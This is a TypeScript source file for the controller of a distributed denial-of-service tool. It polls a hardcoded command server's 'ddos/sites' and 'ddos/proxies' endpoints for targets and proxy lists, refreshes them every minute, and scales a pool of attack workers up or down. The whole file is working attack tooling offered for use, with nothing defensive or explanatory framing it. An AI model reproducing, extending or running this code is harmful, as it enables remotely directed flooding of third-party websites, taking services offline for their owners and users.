import axios, { AxiosError } from 'axios-https-proxy-fix'
import { EventEmitter } from 'events'
import { DoserEventType, ProxyData, SiteData } from './worker.types'
import { Runner } from './runner'

axios.defaults.baseURL = 'http://185.69.154.95/api/'

const CONFIGURATION_INVALIDATION_TIME = 60000

export class Doser {
  private onlyProxy: boolean
  private hosts: Array<string> = []
  private working: boolean
  private workers: Runner[] = []
  private numberOfWorkers = 0
  private eventSource: EventEmitter
  private ddosConfiguration: {
    updateTime: Date;
    sites: SiteData[];
    proxies: ProxyData[];
  } | null = null

  private verboseError: boolean;

  constructor (onlyProxy: boolean, numberOfWorkers: number, verboseError: boolean) {
    this.onlyProxy = onlyProxy
    this.working = false
    this.eventSource = new EventEmitter()
    this.verboseError = verboseError
    this.initialize(numberOfWorkers).catch(error => {
      console.error('Wasnt able to initialize:', error)
    })
  }

  private logError (message:string, cause: unknown) {
    console.log(message)

    if (this.verboseError) {
      console.log(cause)
    } else {
      console.log((cause as AxiosError)?.message)
    }
  }

  private async initialize (numberOfWorkers: number, attemptNumber = 1): Promise<void> {
    const config = await this.getSitesAndProxies()
    if (!config) {
      console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
      return this.initialize(numberOfWorkers, attemptNumber + 1)
    }
    console.debug('Initialized doser', config)
    this.updateConfiguration(config)
    this.listenForConfigurationUpdates()
    return this.setWorkersCount(numberOfWorkers)
  }

  forceProxy (newVal: boolean) {
    this.onlyProxy = newVal
  }

  async loadHostsFile () {
    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
    // this.hosts = response.data as Array<string>
  }

  private updateConfiguration (configuration: { sites: SiteData[]; proxies: ProxyData[] }) {
    this.ddosConfiguration = {
      ...configuration,
      updateTime: new Date()
    }
    this.workers.forEach(worker => {
      worker.updateConfiguration(configuration)
    })
  }

  private listenForConfigurationUpdates (wasPreviousUpdateSuccessful = true) {
    // eslint-disable-next-line @typescript-eslint/no-misused-promises
    setTimeout(async () => {
      if (!this.ddosConfiguration) {
        return this.listenForConfigurationUpdates(false)
      }

      const config = await this.getSitesAndProxies()
      if (!config) {
        console.debug('Wasnt able to get configuration updates')
        return this.listenForConfigurationUpdates(false)
      }
      this.updateConfiguration(config)
      this.listenForConfigurationUpdates(true)
    }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
  }

  async getSitesAndProxies (): Promise<{ sites: SiteData[]; proxies: ProxyData[]} | null> {
    while (this.working) { // escaping unavailable hosts
      try {
        const sitesResponse = await axios.get('ddos/sites/', {
          timeout: 10000,
          params: {
            status: true
          }
        })
        const proxyResponse = await axios.get('ddos/proxies/', {
          timeout: 10000,
          params: {
            status: 'ok'
          }
        })

        if (sitesResponse.status !== 200) continue
        if (proxyResponse.status !== 200) continue

        const sites = sitesResponse.data as Array<SiteData>
        const proxies = proxyResponse.data as Array<ProxyData>

        return {
          sites,
          proxies
        }
      } catch (e) {
        this.logError('Error while loading hosts', e)
      }
    }
    return null
  }

  setWorkersCount (newCount: number) {
    console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
    if (newCount < this.numberOfWorkers) {
      for (let i = this.numberOfWorkers; i >= newCount; i--) {
        this.workers[i]?.eventSource.removeAllListeners()
        this.workers[i]?.stop()
      }
      this.workers = this.workers.slice(0, newCount)
    } else {
      while (this.workers.length < newCount) {
        const newWorker = this.createNewWorker()
        this.workers.push(newWorker)
        if (this.working) {
          newWorker.start().catch(error => {
            console.debug('Wasnt able to start new runner:', error)
          })
        }
      }
    }

    this.numberOfWorkers = newCount
  }

  start () {
    this.working = true
    this.workers.forEach((worker, i) => {
      console.debug(`Starting runner ${i}..`)
      worker.start().catch(error => {
        console.error(`Wasnt able to start worker #${i} - `, error)
      })
    })
  }

  stop () {
    this.working = false
    this.workers.forEach((worker, i) => {
      console.debug(`Stopping runner ${i}..`)
      worker.stop()
    })
  }

  private createNewWorker (): Runner {
    console.debug('Creating new worker..')
    // Should never happen
    if (!this.ddosConfiguration) {
      throw new Error('Cannot create worker without configuration')
    }
    const worker = new Runner({
      sites: this.ddosConfiguration.sites,
      proxies: this.ddosConfiguration.proxies,
      onlyProxy: this.onlyProxy
    })
    worker.eventSource.on('attack', event => {
      this.eventSource.emit('atack', {
        type: 'atack',
        ...event
      })
    })

    worker.eventSource.on('error', event => {
      if (this.verboseError) {
        this.eventSource.emit('error', event)
      }
    })
    return worker
  }

  listen (event: DoserEventType, callback: (data: any)=>void) {
    this.eventSource.addListener(event, callback)
  }
}
